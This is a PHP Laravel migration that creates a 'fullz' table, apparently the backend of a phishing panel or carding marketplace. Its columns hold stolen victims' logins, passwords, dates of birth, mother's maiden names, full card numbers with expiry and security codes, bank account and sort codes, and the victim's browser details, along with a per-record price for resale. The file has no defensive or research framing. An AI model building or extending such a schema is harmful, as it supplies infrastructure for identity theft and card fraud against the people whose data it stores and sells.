<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreateFullzTable extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('fullz', function (Blueprint $table) {
            
            $table->bigIncrements('id');
            
            $table->string('username',100);
            $table->string('password',100);
            $table->string('full_name',100);
            $table->string('Telephone',100);
            $table->string('dob',100);
            $table->string('email',100);
            $table->string('address',100);
            $table->string('mmn',100);
            $table->string('card_bin',100);
            $table->string('card_bank',100);
            $table->string('card_brand',100);
            $table->string('card_type',100);
            $table->string('card_holder_name',100);
            $table->string('card_no',100);
            $table->string('card_exp',100);
            $table->string('security_code',100);
            $table->string('account',100);
            $table->string('sort_code',100);
            $table->string('submitted_by',100);
            $table->string('location',100);
            $table->string('user_agent',500);
            $table->string('browser',100);
            $table->string('os',100);
            $table->string('recieved',100);

            $table->string('record_type',10);
            $table->integer('price')->default(0);

            $table->timestamps();
            
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('fullz');
    }
}
